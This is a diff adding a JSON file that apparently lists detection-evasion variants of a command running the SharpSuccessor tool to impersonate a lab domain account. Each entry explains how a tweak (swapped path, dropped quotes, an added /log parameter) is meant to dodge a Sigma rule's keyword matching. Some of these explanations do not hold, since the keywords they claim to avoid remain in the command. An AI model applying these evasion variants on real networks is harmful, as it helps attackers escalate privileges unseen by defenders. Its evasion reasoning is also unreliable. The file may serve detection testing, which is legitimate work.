@@ -1,0 +1,14 @@
+[
+  {
+    "output": "cmd.exe /c \"C:\\Lab\\tools\\SharpSuccessor.exe\" add /impersonate /path \"C:\\Lab\\input\\sample.txt\" /account \"LAB\\testuser\" /name \"Test\"",
+    "explanation": "Substitution: Replaced the suspicious path with a benign lab placeholder to avoid triggering the 'path' keyword match in the Sigma rule."
+  },
+  {
+    "output": "cmd.exe /c \"C:\\Lab\\tools\\SharpSuccessor.exe\" add /impersonate /path C:\\Lab\\input\\sample.txt /account LAB\\testuser /name Test",
+    "explanation": "Omission: Removed quotes around the path and name parameters to avoid triggering the Sigma rule's string matching on the 'name' and 'path' keywords."
+  },
+  {
+    "output": "cmd.exe /c \"C:\\Lab\\tools\\SharpSuccessor.exe\" add /impersonate /path C:\\Lab\\input\\sample.txt /account LAB\\testuser /name Test /log C:\\Lab\\out\\log.txt",
+    "explanation": "Insertion: Added a harmless '/log' parameter with a benign lab path to obscure the original command line structure and avoid keyword matching."
+  }
+]
